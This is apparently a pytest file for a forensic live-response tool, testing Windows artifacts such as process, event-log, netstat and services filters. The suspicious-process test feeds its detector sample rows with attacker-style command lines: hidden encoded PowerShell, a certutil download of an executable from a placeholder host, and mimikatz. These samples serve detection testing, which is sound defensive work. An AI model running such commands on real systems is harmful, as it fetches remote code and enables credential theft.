# tests/server-api/test_windows_artifacts.py
"""The Windows.* live-response artifacts: requests sent to the agent and the rows they keep."""
import pytest

from app.services.flow_artifacts import builtin_artifacts, build_row_filter, compile_request, resolve_params


def _filter(name, params=None):
    art = builtin_artifacts()[name]
    return art, build_row_filter(art.content, resolve_params(art, params or {}))


def test_windows_artifacts_are_shipped():
    names = {n for n in builtin_artifacts() if n.startswith("Windows.")}
    assert {"Windows.Sys.Pslist", "Windows.Sys.Persistence", "Windows.EventLogs.FailedLogons",
            "Windows.Detection.SuspiciousProcesses", "Windows.Forensics.Prefetch"} <= names
    assert len(names) >= 18


def test_suspicious_processes_flags_the_right_rows():
    _, filt = _filter("Windows.Detection.SuspiciousProcesses")
    rows = [
        {"Pid": 1, "Name": "explorer.exe", "Exe": r"C:\Windows\explorer.exe", "CommandLine": "explorer.exe"},
        {"Pid": 2, "Name": "update.exe", "Exe": r"C:\Users\bob\AppData\Local\Temp\x\update.exe", "CommandLine": "update.exe"},
        {"Pid": 3, "Name": "powershell.exe", "Exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA"},
        {"Pid": 4, "Name": "powershell.exe", "Exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "CommandLine": "powershell.exe Get-ChildItem"},
        {"Pid": 5, "Name": "certutil.exe", "Exe": r"C:\Windows\System32\certutil.exe",
         "CommandLine": "certutil -urlcache -split -f http://x/a.exe a.exe"},
        {"Pid": 6, "Name": "rundll32.exe", "Exe": r"C:\Windows\System32\rundll32.exe",
         "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL"},
        {"Pid": 7, "Name": "mimikatz.exe", "Exe": r"D:\tools\mimikatz.exe", "CommandLine": "mimikatz"},
        {"Pid": 8, "Name": "svchost.exe", "Exe": r"C:\ProgramData\svchost.exe", "CommandLine": "svchost.exe"},
    ]
    assert [r["Pid"] for r in filt.apply("Suspicious", rows)] == [2, 3, 5, 7, 8]


def test_rdp_logons_keep_only_remote_interactive():
    _, filt = _filter("Windows.EventLogs.RDPLogons")
    rows = [
        {"TimeCreated": "t1", "TargetUserName": "admin", "IpAddress": "10.0.0.5", "LogonType": "10"},
        {"TimeCreated": "t2", "TargetUserName": "svc", "IpAddress": "-", "LogonType": "5"},
    ]
    assert [r["TargetUserName"] for r in filt.apply("Events", rows)] == ["admin"]


@pytest.mark.parametrize("name,channel,ids", [
    ("Windows.EventLogs.FailedLogons", "Security", "4625"),
    ("Windows.EventLogs.ServiceInstalls", "System", "7045"),
    ("Windows.EventLogs.PowerShellScriptBlocks", "Microsoft-Windows-PowerShell/Operational", "4104"),
    ("Windows.EventLogs.DefenderDetections", "Microsoft-Windows-Windows Defender/Operational", "1116,1117,1118,1119,5001"),
])
def test_eventlog_artifacts_compile_to_the_right_query(name, channel, ids):
    art = builtin_artifacts()[name]
    req = compile_request(art, "f1", resolve_params(art, {"Hours": 6}), 600, 1000)
    args = req["sources"][0]["args"]
    assert (args["channel"], args["event_ids"], str(args["hours"])) == (channel, ids, "6")


def test_generic_query_takes_channel_and_ids_from_params():
    art = builtin_artifacts()["Windows.EventLogs.Query"]
    req = compile_request(art, "f1", resolve_params(art, {"Channel": "Microsoft-Windows-Sysmon/Operational",
                                                          "EventIDs": "1,3"}), 600, 1000)
    args = req["sources"][0]["args"]
    assert (args["channel"], args["event_ids"]) == ("Microsoft-Windows-Sysmon/Operational", "1,3")


def test_netstat_and_services_filters():
    _, filt = _filter("Windows.Network.Netstat", {"StateRegex": "^ESTABLISHED$"})
    rows = [{"State": "ESTABLISHED", "LocalPort": 1}, {"State": "LISTEN", "LocalPort": 2}]
    assert [r["LocalPort"] for r in filt.apply("Connections", rows)] == [1]
    _, filt = _filter("Windows.Sys.Services", {"StartModeRegex": "^Auto$"})
    rows = [{"Name": "a", "StartMode": "Auto"}, {"Name": "b", "StartMode": "Manual"}]
    assert [r["Name"] for r in filt.apply("Services", rows)] == ["a"]
